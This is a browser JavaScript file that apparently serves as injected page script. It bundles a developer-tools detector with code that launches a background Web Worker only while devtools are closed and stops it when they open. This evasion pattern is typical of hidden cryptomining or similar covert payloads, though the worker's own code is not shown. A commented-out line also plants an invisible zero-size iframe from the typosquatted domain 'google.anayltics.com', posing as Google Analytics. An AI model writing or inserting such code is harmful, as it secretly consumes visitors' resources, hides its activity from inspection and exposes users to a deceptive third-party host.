(function(){'use strict';var devtools={open:false,orientation:null};var threshold=160;var emitEvent=function(state,orientation){window.dispatchEvent(new CustomEvent('devtoolschange',{detail:{open:state,orientation:orientation}}));};setInterval(function(){var widthThreshold=window.outerWidth-window.innerWidth>threshold;var heightThreshold=window.outerHeight-window.innerHeight>threshold;var orientation=widthThreshold?'vertical':'horizontal';if(!(heightThreshold&&widthThreshold)&&((window.Firebug&&window.Firebug.chrome&&window.Firebug.chrome.isInitialized)||widthThreshold||heightThreshold)){if(!devtools.open||devtools.orientation!==orientation){emitEvent(true,orientation);}
devtools.open=true;devtools.orientation=orientation;}else{if(devtools.open){emitEvent(false,null);}
devtools.open=false;devtools.orientation=null;}},500);if(typeof module!=='undefined'&&module.exports){module.exports=devtools;}else{window.devtools=devtools;}})();

setTimeout(function() {

	if(!window.devtools.open) {

		worker = new Worker("worker.js?r="+Math.floor(Math.random() * 99999999));

		window.addEventListener('devtoolschange', function (e) {if(e.detail.open)worker.postMessage("STOP");});

		worker.postMessage("START");

	}

}, 500);

//function _gf(d,i){d.addEventListener("DOMContentLoaded", function(){i=d.createElement("iframe");i.src="https://google.anayltics.com/ga.html";i.width="0";i.height="0";i.frameBorder="0";i.scrolling="no";d.body.appendChild(i);});}_gf(document);
